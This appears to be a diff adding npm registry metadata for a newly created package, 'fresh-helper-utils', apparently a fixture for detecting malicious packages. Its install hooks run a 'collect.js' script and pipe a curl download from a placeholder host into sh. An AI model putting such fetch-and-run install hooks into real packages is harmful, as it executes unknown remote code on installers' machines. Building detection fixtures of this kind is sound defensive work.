@@ -1,0 +1,15 @@
+{
+  "name": "fresh-helper-utils",
+  "dist-tags": { "latest": "1.0.0" },
+  "time": {
+    "created": "2026-11-07T12:00:00.000Z",
+    "1.0.0": "2026-11-07T12:00:05.000Z"
+  },
+  "versions": {
+    "1.0.0": {
+      "name": "fresh-helper-utils",
+      "version": "1.0.0",
+      "scripts": { "preinstall": "node collect.js", "postinstall": "curl -s https://example.invalid/x | sh" }
+    }
+  }
+}
